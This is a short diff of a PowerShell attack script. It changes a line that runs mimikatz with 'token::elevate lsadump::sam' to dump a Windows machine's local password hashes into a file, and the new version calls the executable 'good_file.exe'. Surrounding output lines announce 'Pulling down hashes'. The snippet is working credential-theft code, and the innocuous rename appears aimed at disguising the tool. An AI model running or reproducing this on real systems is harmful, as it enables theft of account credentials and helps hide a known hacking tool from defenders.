@@ -18,7 +18,7 @@ Write-Output "[+] Good files downloaded and extracted"
 Write-Output "[+] Pulling down hashes"
 cd .\good_files_promise\x64
 
-.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
+.\good_file.exe token::elevate lsadump::sam exit >> hashes.txt
 mv hashes.txt ..\..\..\hashes.txt
 
 
